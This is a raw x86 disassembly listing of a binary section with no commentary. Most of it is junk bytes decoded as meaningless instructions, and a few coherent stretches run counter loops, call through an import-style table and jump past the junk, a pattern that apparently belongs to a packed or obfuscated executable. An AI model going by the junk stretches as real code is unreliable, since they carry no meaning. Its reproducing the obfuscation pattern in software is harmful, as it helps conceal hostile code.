  411ff1:	in     al,0x33
  411ff3:	ror    DWORD PTR [ebx],cl
  411ff5:	add    BYTE PTR [esi+0x35ac39b2],dh
  411ffb:	lahf   
  411ffc:	mov    WORD PTR [ebp-0x20c7a77b],?
  412002:	xor    bl,BYTE PTR [ebx]
  412004:	mov    DWORD PTR [ecx-0x7],esp
  412007:	or     esi,DWORD PTR ds:0x825c101a
  41200d:	outs   dx,DWORD PTR ds:[esi]
  41200e:	out    dx,eax
  41200f:	sub    BYTE PTR [edi-0x1d],0x8
  412013:	mov    BYTE PTR [ecx-0x5b],0xf6
  412017:	xor    al,0xcb
  412019:	and    dh,cl
  41201b:	add    DWORD PTR [ebx],ebp
  41201d:	add    DWORD PTR [ebp-0x3585aca],esi
  412023:	dec    esp
  412024:	rol    edx,1
  412026:	jb     0x411fda
  412028:	push   0x7b
  41202a:	mov    dh,0x2
  41202c:	and    eax,DWORD PTR [esi-0x40]
  41202f:	loop   0x41202d
  412031:	mov    eax,ds:0xdca981d
  412036:	bound  edx,QWORD PTR [ebx-0x3d]
  412039:	xchg   ebx,eax
  41203a:	jne    0x412064
  41203c:	add    esp,DWORD PTR [ebx+eiz*8-0x2b4d497b]
  412043:	dec    edx
  412044:	xchg   edi,eax
  412045:	popa   
  412046:	rcr    DWORD PTR [edi+0x6b7c159f],0x85
  41204d:	mov    ecx,0x2e5e3677
  412052:	das    
  412053:	xor    al,al
  412055:	add    ebx,0xe8f3f176
  41205b:	jns    0x411ff2
  41205d:	pop    esi
  41205e:	or     bl,bh
  412060:	cmp    ah,0x44
  412063:	cs push 0x1b
  412066:	push   ds
  412067:	push   eax
  412068:	xchg   ecx,eax
  412069:	jno    0x4120aa
  41206b:	js     0x412068
  41206d:	sbb    DWORD PTR [eax],0x25
  412070:	pop    ss
  412071:	sahf   
  412072:	mov    ebp,0x5022826d
  412077:	cmp    eax,0x1e10f80e
  41207c:	jg     0x412053
  41207e:	je     0x4120e8
  412080:	(bad)  
  412081:	cdq    
  412082:	js     0x4120c1
  412084:	call   0xe095:0x7ef8a78e
  41208b:	in     eax,0x76
  41208d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41208e:	ja     0x41207f
  412090:	and    eax,0x238fa505
  412095:	inc    bl
  412097:	push   ecx
  412098:	mov    ecx,0xd292c103
  41209d:	adc    al,0xc
  41209f:	dec    edi
  4120a0:	shl    BYTE PTR [ebp-0x64],0x7b
  4120a4:	test   ebx,edx
  4120a6:	push   ebx
  4120a7:	mov    ecx,DWORD PTR ds:[ebx+0x8b0845]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	retf   0x3b37
  412170:	adc    eax,DWORD PTR [esi+0x5f]
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xe170707e
  41217a:	mov    ecx,0x50ab24b8
  41217f:	and    BYTE PTR [edi-0x72],ah
  412182:	push   esp
  412183:	xchg   esi,eax
  412184:	imul   eax,DWORD PTR [eax-0x3d],0x76
  412188:	pusha  
  412189:	pusha  
  41218a:	es jmp 0x4512:0x82bf8086
  412192:	mov    ch,0xf2
  412194:	jns    0x412204
  412196:	push   cs
  412197:	push   cs
  412198:	cmp    BYTE PTR ds:0xfa55fa1c,bl
  41219e:	fsub   DWORD PTR [ebx-0x7e239e0a]
  4121a4:	cmp    edi,0xc6833e72
  4121aa:	mov    edi,0xef853f5f
  4121af:	sub    bl,ch
  4121b1:	popf   
  4121b2:	mov    edi,edx
  4121b4:	adc    eax,0x13d369d1
  4121b9:	aas    
  4121ba:	addr16 xchg edi,eax
  4121bc:	jb     0x4121ff
  4121be:	mov    ds:0xaf1f840b,eax
  4121c3:	mov    edi,0x3a713d80
  4121c8:	mov    edx,0x3ff4fb94
  4121cd:	dec    ebp
  4121ce:	xchg   esi,eax
  4121cf:	add    eax,0xaaa7e1da
  4121d4:	xchg   DWORD PTR [edx+0x3c301805],edi
  4121da:	xchg   esi,eax
  4121db:	dec    ebp
  4121dc:	or     eax,0x5ffd09e7
  4121e1:	jl     0x41219a
  4121e3:	pop    eax
  4121e4:	mov    esi,0xd3f7fb25
  4121e9:	inc    ebx
  4121ea:	mov    esi,0xd0271d00
  4121ef:	out    0x5d,al
  4121f1:	cmp    al,0xe4
  4121f3:	sub    BYTE PTR [esi],ah
  4121f5:	sbb    eax,0x9d475963
  4121fa:	ret    0xf4a1
  4121fd:	into   
  4121fe:	mov    esi,0x25fac2b8
  412203:	aad    0x6b
  412205:	sti    
  412206:	nop
  412207:	jo     0x4121d0
  412209:	sbb    cl,BYTE PTR [ebx-0x35954bcf]
  41220f:	aad    0x89
  412211:	cld    
  412212:	out    0xae,al
  412214:	call   0xaff50a30
  412219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41221a:	jo     0x41219e
  41221c:	xchg   ebp,eax
  41221d:	dec    ecx
  41221e:	sub    al,0x1f
  412220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412221:	popa   
  412222:	(bad)  
  412223:	xor    ah,BYTE PTR [esi-0x1b]
  412226:	cmp    DWORD PTR [edi+esi*2+0x75ed4c9b],0x5e47d69a
  412231:	mov    bl,0xaf
  412233:	inc    ebx
  412234:	(bad)  
  412235:	add    eax,DWORD PTR gs:[esi]
  412238:	fidivr WORD PTR [ebp-0x1d]
  41223b:	add    ebx,DWORD PTR [eax+ecx*4-0x2]
  41223f:	and    al,0xdd
  412241:	(bad)  
  412243:	push   ebp
  412244:	(bad)  
  412245:	adc    DWORD PTR [ebx],edx
  412247:	sub    BYTE PTR [ebx-0x4feab232],dl
  41224d:	xor    DWORD PTR [edx],edx
  41224f:	sub    cl,0x59
  412252:	leave  
  412253:	repz and BYTE PTR ds:0x52f875ec,0xef
  41225b:	imul   esp,edx,0x40
  41225e:	sub    dl,BYTE PTR [ebp-0x61]
  412261:	and    eax,0x3f6467ec
  412266:	push   cs
  412267:	inc    edi
  412268:	mov    ch,0xf8
  41226a:	data16 jecxz 0x41221d
  41226d:	jo     0x41220a
  41226f:	sbb    al,0x4a
  412271:	fnsave [edi-0x23]
  412274:	out    0x56,eax
  412276:	xor    eax,ecx
  412278:	shl    DWORD PTR [esi],1
  41227a:	fld    DWORD PTR [ebx-0x5b]
  41227d:	es (bad) 
  41227f:	cmp    eax,0x437ed10b
  412284:	push   eax
  412285:	sbb    al,0xa5
  412287:	cmc    
  412288:	add    edx,ebp
  41228a:	pop    eax
  41228b:	xchg   edx,eax
  41228c:	and    DWORD PTR [edi+0x16],esi
  41228f:	sbb    esi,DWORD PTR [eax]
  412291:	cmp    al,0x83
  412293:	adc    DWORD PTR ds:0x656c15eb,esp
  412299:	fstp   TBYTE PTR [ebp+0x74733d6e]
  41229f:	mov    ah,0x6a
  4122a2:	sub    ebp,ebx
  4122a4:	(bad)  
  4122a5:	jg     0x412289
  4122a7:	loop   0x412284
  4122a9:	cmp    eax,0x754ea44a
  4122ae:	dec    ebp
  4122af:	test   DWORD PTR ds:[esp+ebx*2+0x5f52524c],edx
  4122b7:	push   ebx
  4122b8:	mov    DWORD PTR [edx],ebx
  4122ba:	stos   BYTE PTR es:[edi],al
  4122bb:	fld    TBYTE PTR [edi-0x1c]
  4122be:	cmp    DWORD PTR [edx+esi*4+0xcbc289c],ecx
  4122c5:	(bad)  
  4122c6:	pop    ebx
  4122c7:	les    edx,FWORD PTR [ebp+0x5fdd0211]
  4122cd:	sti    
  4122ce:	fisubr DWORD PTR [edi+edi*4+0x2469d605]
  4122d5:	rcl    BYTE PTR [eax+0x387a3794],1
  4122db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122dc:	dec    esp
  4122dd:	cmp    BYTE PTR [esi+ebp*1],0xe1
  4122e1:	test   DWORD PTR [eax-0x32],0x28cb3194
  4122e8:	push   ebp
  4122e9:	cwde   
  4122ea:	adc    BYTE PTR [eax],cl
  4122ec:	pop    esi
  4122ed:	pop    edi
  4122ee:	ins    BYTE PTR es:[edi],dx
  4122ef:	imul   ebx,DWORD PTR [ebx],0xc3bc31b3
  4122f5:	daa    
  4122f6:	std    
  4122f7:	push   ds
  4122f8:	inc    ebp
  4122f9:	or     ebx,ebp
  4122fb:	mov    esi,0x507df07f
  412300:	push   edi
  412301:	add    eax,0x428d684b
  412306:	mov    ebx,0xb80ce5a4
  41230b:	sbb    edi,ecx
  41230d:	fadd   QWORD PTR [ebx-0x5eb1d063]
  412313:	dec    esp
  412314:	retf   
  412315:	cli    
  412316:	or     BYTE PTR [ebx+0x40],bh
  412319:	leave  
  41231a:	dec    ebp
  41231b:	add    ch,ch
  41231d:	mov    ecx,0x98d7b972
  412322:	test   DWORD PTR ds:0x37fd9392,ebx
  412328:	cmp    al,0xe4
  41232a:	or     ch,BYTE PTR ds:0x889c2a1a
  412330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412331:	or     eax,0xe444d760
  412336:	mov    dl,0x0
  412339:	dec    edi
  41233a:	fistp  DWORD PTR [edi-0x3265e855]
  412340:	or     bl,BYTE PTR [edx]
  412342:	test   al,0xb7
  412344:	out    dx,al
  412345:	adc    bh,BYTE PTR [ecx-0x15]
  412348:	sub    al,0x16
  41234a:	mov    ecx,0x6f9ed07b
  41234f:	xor    al,0x4a
  412351:	mov    ds:0xa7378a43,al
  412356:	jmp    0x412371
  412358:	jl     0x4122eb
  41235a:	out    dx,eax
  41235b:	cmp    al,0x66
  41235d:	push   ss
  41235e:	rol    BYTE PTR [ebp+0x6e],1
  412361:	mov    edx,0x7e9e6271
  412366:	push   esi
  412367:	push   0x5e57401b
  41236c:	sbb    dh,dl
  41236e:	push   esi
  41236f:	jg     0x412374
  412371:	scas   al,BYTE PTR es:[edi]
  412372:	jno    0x41230d
  412374:	shl    BYTE PTR [edx+ecx*8],cl
  412377:	popa   
  412378:	adc    al,0xe3
  41237a:	ds retf 0x5fa5
  41237e:	(bad)  
  41237f:	dec    ecx
  412380:	mov    edi,0x8acf3224
  412385:	dec    ebx
  412386:	or     esp,DWORD PTR ds:0x34229312
  41238c:	mov    ds:0x13815467,eax
  412391:	cdq    
  412392:	out    dx,al
  412393:	std    
  412394:	sub    eax,0x37bea6d1
  412399:	or     dh,BYTE PTR [eax+0x2e]
  41239c:	inc    edx
  41239d:	jb     0x412411
  41239f:	cld    
  4123a0:	fmul   QWORD PTR [edi+0x2a9d365a]
  4123a6:	loop   0x412337
  4123a8:	mov    BYTE PTR [edx],al
  4123aa:	std    
  4123ab:	xor    eax,edi
  4123ad:	cdq    
  4123ae:	sbb    al,0x5f
  4123b0:	repz and ecx,DWORD PTR [eax+0x1e]
  4123b4:	dec    ecx
  4123b5:	pusha  
  4123b6:	push   es
  4123b7:	hlt    
  4123b8:	inc    ecx
  4123b9:	pop    edi
  4123ba:	icebp  
  4123bb:	and    dh,BYTE PTR [edx-0x22]
  4123be:	inc    ebx
  4123bf:	add    al,0xc4
  4123c1:	sub    BYTE PTR [ebx],ah
  4123c3:	mov    ecx,gs
  4123c5:	sbb    BYTE PTR [ecx],cl
  4123c7:	xchg   ecx,eax
  4123c8:	ret    0x6e7b
  4123cb:	pop    edi
  4123cc:	sbb    DWORD PTR [edx],edx
  4123ce:	xchg   ecx,eax
  4123cf:	in     eax,dx
  4123d0:	call   DWORD PTR [ebx-0x37]
  4123d3:	dec    esi
  4123d4:	jmp    0x113c:0x63231513
  4123db:	jno    0x4123b7
  4123dd:	push   ebp
  4123de:	adc    al,0xaa
  4123e0:	mov    cl,0xa1
  4123e2:	push   ecx
  4123e3:	sbb    DWORD PTR [edi+edx*2-0x23],esi
  4123e7:	cmp    al,0xcc
  4123e9:	sbb    bh,BYTE PTR [ecx]
  4123eb:	clc    
  4123ec:	mov    dh,0xb0
  4123ee:	add    ah,BYTE PTR [ebp+0x3aebee85]
  4123f4:	jmp    DWORD PTR [eax+ebx*1-0x37]
  4123f8:	stc    
  4123f9:	mov    BYTE PTR [ecx+0x22],bl
  4123fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123fd:	je     0x4123f8
  4123ff:	push   ebx
  412400:	mov    eax,ds:0x4c70f07e
  412405:	sbb    eax,DWORD PTR [ecx-0x65]
  412408:	cmp    DWORD PTR [edi+0x667c3ed5],ecx
  41240e:	push   0xffffff8e
  412410:	inc    eax
  412411:	and    BYTE PTR [ebx+0x21],dh
  412414:	sub    dh,BYTE PTR [eax+0x33]
  412417:	sbb    eax,0x2ef921d4
  41241c:	adc    BYTE PTR [ebx],ah
  41241e:	or     BYTE PTR ds:0x4e10c20a,ah
  412424:	outs   dx,DWORD PTR ds:[esi]
  412425:	test   al,0xce
  412427:	xor    bl,bh
  412429:	push   ecx
  41242a:	xlat   BYTE PTR ds:[ebx]
  41242b:	in     al,dx
  41242c:	popa   
  41242d:	ret    
  41242e:	popa   
  41242f:	dec    esi
  412430:	sub    dl,BYTE PTR [ebx-0x578372c1]
  412436:	fs mov eax,ss:0xdff6de2d
  41243d:	aam    0xf3
  41243f:	popa   
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	lods   eax,DWORD PTR ds:[esi]
  41245e:	(bad)  
  41245f:	call   edi
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xe570707e
  41246a:	jg     0x4124e4
  41246c:	and    al,cl
  41246e:	cmp    ecx,DWORD PTR [edx+0x8]
  412471:	mov    WORD PTR [esi],fs
  412473:	fnstsw WORD PTR [esi-0x9]
  412476:	xchg   ebp,eax
  412477:	icebp  
  412478:	adc    dl,BYTE PTR [edi+0x74260a2d]
  41247e:	sbb    ch,BYTE PTR [ecx+0x47]
  412481:	cmp    eax,0x75fa9a25
  412486:	sub    ebp,DWORD PTR [edi+0x55e015f5]
  41248c:	mov    esp,0x6fd8f11d
  412491:	sbb    eax,0xaee23a6e
  412496:	fisttp DWORD PTR [ecx]
  412498:	sbb    eax,0x16ffaaee
  41249d:	fisub  WORD PTR [eax]
  41249f:	mul    DWORD PTR [ecx+0x5f]
  4124a2:	jmp    0x22f9f68
  4124a7:	cmp    DWORD PTR [esi-0x5c53198f],ebp
  4124ad:	push   ecx
  4124ae:	stos   BYTE PTR es:[edi],al
  4124af:	lods   eax,DWORD PTR ds:[esi]
  4124b0:	test   eax,0x71d3af56
  4124b5:	jle    0x412454
  4124b7:	mov    edi,DWORD PTR [ebx+0x42]
  4124ba:	iret   
  4124bb:	retf   
  4124bc:	and    dl,BYTE PTR ss:[ebp+0x7d87aa1c]
  4124c3:	sbb    al,0x1a
  4124c5:	shl    BYTE PTR [eax],0xb
  4124c8:	or     DWORD PTR [eax],edi
  4124ca:	popa   
  4124cb:	fcomp  st(3)
  4124cd:	sahf   
  4124ce:	xchg   ebp,eax
  4124cf:	mov    edx,0x79b77ed5
  4124d4:	ins    BYTE PTR es:[edi],dx
  4124d5:	jae    0x412555
  4124d7:	cmp    al,0x96
  4124d9:	push   cs
  4124da:	retf   0x50bc
  4124dd:	stos   DWORD PTR es:[edi],eax
  4124de:	int3   
  4124df:	dec    edi
  4124e0:	iret   
  4124e1:	sar    BYTE PTR [edi-0x3d],0x0
  4124e5:	lods   al,BYTE PTR ds:[esi]
  4124e6:	int3   
  4124e7:	imul   ch
  4124e9:	sahf   
  4124ea:	inc    esp
  4124eb:	cwde   
  4124ec:	adc    DWORD PTR ds:0x3fdfc4db,edx
  4124f2:	sahf   
  4124f3:	popf   
  4124f4:	dec    ebx
  4124f5:	dec    eax
  4124f6:	ret    0xe4cb
  4124f9:	dec    ebx
  4124fa:	push   0xffffffc7
  4124fc:	push   0x3b
  4124fe:	not    DWORD PTR [edx]
  412500:	and    BYTE PTR [edi-0x7c],bl
  412503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412504:	or     esp,DWORD PTR [edi]
  412506:	in     eax,0x6e
  412508:	xor    ah,BYTE PTR [esi-0x4e92daa1]
  41250e:	mov    ds:0x93cf894f,al
  412513:	int3   
  412514:	xchg   esi,eax
  412515:	ja     0x41258b
  412517:	dec    ebx
  412518:	push   0xffffffe7
  41251a:	test   DWORD PTR [esi],eax
  41251c:	inc    edx
  41251d:	das    
  41251e:	cmc    
  41251f:	sar    DWORD PTR [ebx+0x52cb6243],cl
  412525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412526:	leave  
  412527:	xchg   edi,eax
  412528:	in     eax,0xce
  41252a:	leave  
  41252b:	ja     0x412570
  41252d:	ffreep st(4)
  41252f:	add    cl,BYTE PTR [eax+ebx*4+0x6bf971ea]
  412536:	cmp    eax,ebx
  412538:	clc    
  412539:	xchg   esp,eax
  41253a:	pop    edi
  41253b:	cmp    DWORD PTR [ebp-0x71],esp
  41253e:	mov    DWORD PTR [edx+0x391eaa05],ebx
  412544:	out    dx,eax
  412545:	into   
  412546:	ret    
  412547:	hlt    
  412548:	fcmovbe st,st(6)
  41254a:	dec    ebp
  41254b:	fstp   DWORD PTR [esi]
  41254d:	jb     0x4124ff
  41254f:	std    
  412550:	add    DWORD PTR [edi-0x2a],edx
  412553:	or     edi,DWORD PTR [ebp+ecx*1-0x6d]
  412557:	mov    edi,esi
  412559:	test   ch,dh
  41255b:	(bad)  
  41255c:	xor    BYTE PTR [edi-0x31525669],dl
  412562:	mov    WORD PTR [ecx+0x7a3ef392],?
  412568:	ret    
  412569:	pop    edi
  41256a:	lods   al,BYTE PTR ds:[esi]
  41256b:	and    eax,0xdfb795ad
  412570:	mov    DWORD PTR [esi+0x47],edx
  412573:	lods   al,BYTE PTR ds:[esi]
  412574:	pop    ebp
  412575:	dec    esi
  412576:	dec    edx
  412577:	imul   edx,DWORD PTR [edx-0x580e3b8e],0x98a19a7f
  412581:	lods   al,BYTE PTR ds:[esi]
  412582:	fisubr DWORD PTR [ebx-0x645339bc]
  412588:	xchg   edi,eax
  412589:	shl    DWORD PTR [ebx+ebx*2+0x121a7316],cl
  412590:	test   DWORD PTR [eax-0x3de5c26b],ebp
  412596:	out    dx,eax
  412597:	loope  0x4125ed
  412599:	or     edi,DWORD PTR [ecx+0xa]
  41259c:	cmp    edi,DWORD PTR [ebp+0x47]
  41259f:	and    DWORD PTR [edx+0xc7be7c],edi
  4125a5:	add    DWORD PTR [esi+0x75],esi
  4125a8:	push   cs
  4125a9:	shr    esi,cl
  4125ab:	(bad)  
  4125ac:	js     0x4125b9
  4125ae:	cwde   
  4125af:	enter  0xac24,0x64
  4125b3:	jnp    0x4125ec
  4125b5:	leave  
  4125b6:	add    BYTE PTR [ebx],al
  4125b8:	add    eax,0x94ebcb53
  4125bd:	aad    0x6f
  4125bf:	lods   al,BYTE PTR cs:[esi]
  4125c1:	in     eax,dx
  4125c2:	adc    al,0x63
  4125c4:	and    DWORD PTR ds:0x8dc1e289,edx
  4125ca:	push   0xa527fe7
  4125cf:	mov    cs,WORD PTR [esi+0x259e1162]
  4125d5:	xchg   esp,eax
  4125d6:	gs in  eax,0x64
  4125d9:	mov    edi,0xc22172fa
  4125de:	popa   
  4125df:	xor    BYTE PTR [esi-0x307f2e55],dh
  4125e5:	fcmovu st,st(2)
  4125e7:	imul   esi,esi,0xffffffc6
  4125ea:	scas   al,BYTE PTR es:[edi]
  4125eb:	das    
  4125ec:	nop
  4125ed:	sub    DWORD PTR [esi+0x4f],edx
  4125f0:	ror    DWORD PTR ds:0x329050de,0x93
  4125f7:	pop    DWORD PTR [ecx+0x5d3c52a6]
  4125fd:	mov    dh,0xf2
  4125ff:	push   0xffffffe8
  412601:	imul   ebx,ecx,0x16
  412604:	int    0x9b
  412606:	rol    BYTE PTR [eax-0x69],0xaf
  41260a:	push   ss
  41260b:	push   cs
  41260c:	sahf   
  41260d:	(bad)  
  41260e:	in     eax,0x8
  412610:	cmp    eax,0xc0974ad8
  412615:	popa   
  412616:	mov    cl,0x49
  412618:	fiadd  WORD PTR [ecx+eax*4]
  41261b:	test   eax,0x3c91ccf
  412620:	test   DWORD PTR [esi+0x4e35e6bb],edi
  412626:	mov    edi,0x44bd574f
  41262b:	push   eax
  41262c:	push   cs
  41262d:	or     DWORD PTR [edx],edx
  41262f:	dec    esi
  412630:	dec    edi
  412631:	pop    edx
  412632:	(bad)  
  412633:	mov    edi,0xb56839ba
  412638:	cdq    
  412639:	xlat   BYTE PTR ds:[ebx]
  41263a:	pop    ss
  41263b:	sub    edi,eax
  41263d:	cmp    cl,BYTE PTR ss:[esi+0x5763a7fa]
  412644:	pop    esi
  412645:	jl     0x4125f7
  412647:	xchg   edi,eax
  412648:	je     0x4125f3
  41264a:	das    
  41264b:	cwde   
  41264c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41264d:	(bad)  [ecx+eax*2+0x6e3887e5]
  412654:	jnp    0x412688
  412656:	(bad)
  412659:	mov    al,0xd9
  41265b:	cdq    
  41265c:	pop    esp
  41265d:	push   cs
  41265e:	dec    esp
  41265f:	jae    0x4126ad
  412661:	cmc    
  412662:	lea    edx,[esi+0x46]
  412665:	jns    0x4126d1
  412667:	aaa    
  412668:	dec    esp
  412669:	sbb    bh,bh
  41266b:	inc    ebx
  41266c:	pop    eax
  41266d:	jl     0x412632
  41266f:	xlat   BYTE PTR ds:[ebx]
  412670:	push   es
  412671:	lods   eax,DWORD PTR ds:[esi]
  412672:	das    
  412673:	fist   WORD PTR [edx+eax*2-0x176850bd]
  41267a:	leave  
  41267b:	push   0xe1747ea2
  412680:	push   eax
  412681:	add    eax,0x975247d1
  412686:	mov    ecx,0x40504a66
  41268b:	imul   ecx,esp,0x11
  41268e:	xchg   edx,eax
  41268f:	cs adc al,0xf0
  412692:	mov    ds:0x27073f5f,eax
  412697:	jge    0x412644
  412699:	outs   dx,BYTE PTR ds:[esi]
  41269a:	or     BYTE PTR [edx],cl
  41269c:	dec    esi
  41269d:	or     DWORD PTR [esi+0x2c4af94],0xffffff9d
  4126a4:	rol    ecx,1
  4126a6:	jnp    0x4126ba
  4126a8:	mov    dl,0x22
  4126aa:	mov    ds:0x72beee0d,eax
  4126af:	pushf  
  4126b0:	sub    cl,dl
  4126b2:	in     eax,dx
  4126b3:	ror    ebx,cl
  4126b5:	lds    eax,FWORD PTR [ebx+0x4f57d38a]
  4126bb:	outs   dx,DWORD PTR ds:[esi]
  4126bc:	mov    dh,0x2e
  4126be:	cmp    DWORD PTR [eax],esi
  4126c0:	inc    ebx
  4126c1:	cs sahf 
  4126c3:	xchg   BYTE PTR [eax],bh
  4126c5:	(bad)  
  4126c6:	call   0x4ba4c7b0
  4126cb:	or     ebx,ebx
  4126cd:	popf   
  4126ce:	mov    ds,WORD PTR [ecx]
  4126d0:	jbe    0x4126b0
  4126d2:	jbe    0x412695
  4126d4:	dec    esi
  4126d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d6:	jle    0x4126f3
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	jmp    0x89abd245
  4126de:	jmp    0xd7b58781
  4126e3:	sub    eax,0x1478a6bd
  4126e8:	cmp    esi,DWORD PTR [ebx-0x7202e324]
  4126ee:	pushf  
  4126ef:	fadd   QWORD PTR [eax]
  4126f1:	and    BYTE PTR [eax],cl
  4126f3:	mov    WORD PTR [edi],ss
  4126f5:	and    ecx,ebx
  4126f7:	addr16 push esp
  4126f9:	mov    al,0x26
  4126fb:	and    al,0xee
  4126fd:	cli    
  4126fe:	loop   0x412770
  412700:	push   ds
  412701:	add    BYTE PTR [ebx-0x64083e0a],cl
  412707:	out    0xf3,al
  412709:	mov    ecx,0x89674866
  41270e:	fnsave [ebx+eiz*8+0x2b]
  412712:	and    BYTE PTR [esi+ecx*2+0x64c79893],0x2c
  41271a:	push   ss
  41271b:	push   es
  41271c:	and    eax,0xb94ab4c
  412721:	leave  
  412722:	pop    esi
  412723:	enter  0xe3db,0xb8
  412727:	cmp    ch,BYTE PTR [esi+0x26c1def8]
  41272d:	or     al,0xb9
  41272f:	adc    BYTE PTR [ecx+0x2581e44d],cl
  412735:	jbe    0x412734
  412737:	inc    edx
  412738:	add    BYTE PTR [eax],al
  41273a:	add    BYTE PTR [eax],al
  41273c:	add    cl,ch
  41273e:	sldt   WORD PTR [eax]
  412741:	add    BYTE PTR [ebx],dh
  412743:	leave  
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebp,DWORD PTR [ecx-0x375fb3d9]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0x2d70707e
  4127ca:	sub    bl,BYTE PTR [ecx]
  4127cc:	mov    al,ds:0x981b0c93
  4127d1:	or     ah,dh
  4127d3:	sahf   
  4127d4:	inc    esi
  4127d5:	dec    edi
  4127d6:	xchg   esp,eax
  4127d7:	ret    0x4f5a
  4127da:	ds ins DWORD PTR es:[edi],dx
  4127dc:	das    
  4127dd:	jne    0x4127cb
  4127df:	ret    
  4127e0:	fbld   TBYTE PTR [edx-0x1d]
  4127e3:	iret   
  4127e4:	mov    ah,0x39
  4127e6:	inc    edx
  4127e7:	es leave 
  4127e9:	rcr    BYTE PTR [edi-0x480604ac],0x47
  4127f0:	test   al,0xf9
  4127f2:	pop    esi
  4127f3:	sub    BYTE PTR [ebp-0x46],ah
  4127f6:	enter  0x65b6,0x18
  4127fa:	mov    esp,0xf1ad62cb
  4127ff:	mov    esi,0x65ed07aa
  412804:	retf   
  412805:	adc    BYTE PTR [edi+0x19e63104],dh
  41280b:	test   BYTE PTR [esi],bl
  41280d:	shr    DWORD PTR [eax],0xf4
  412810:	mov    ebx,0x84fd13da
  412815:	rcl    DWORD PTR [esi],cl
  412817:	push   ebx
  412818:	ins    DWORD PTR es:[edi],dx
  412819:	push   ebp
  41281a:	jge    0x412860
  41281c:	cmp    edx,ebp
  41281e:	xchg   ebp,eax
  41281f:	dec    esp
  412820:	stos   DWORD PTR es:[edi],eax
  412821:	loopne 0x412878
  412823:	test   BYTE PTR [ebx],ch
  412825:	sbb    al,0xd
  412827:	test   DWORD PTR [eax],esp
  412829:	jb     0x41283f
  41282b:	jae    0x4127cd
  41282d:	and    al,0x81
  41282f:	mov    bl,0xc7
  412831:	popa   
  412832:	stc    
  412833:	stc    
  412834:	mov    dl,0x3f
  412836:	inc    ecx
  412837:	ret    0x3a10
  41283a:	pop    edx
  41283b:	adc    BYTE PTR [ebx-0x29],ch
  41283e:	test   BYTE PTR [esi+0x69],bl
  412841:	pop    ebx
  412842:	psubd  mm7,QWORD PTR [edx+0x2d]
  412846:	add    eax,0x37ac4afe
  41284b:	push   ebp
  41284c:	mov    esi,0xbc432852
  412851:	aas    
  412852:	mov    DWORD PTR [edi+ecx*4-0x3e],ebp
  412856:	into   
  412857:	jmp    edx
  412859:	call   0x518b:0xa2bb86e2
  412860:	pop    edi
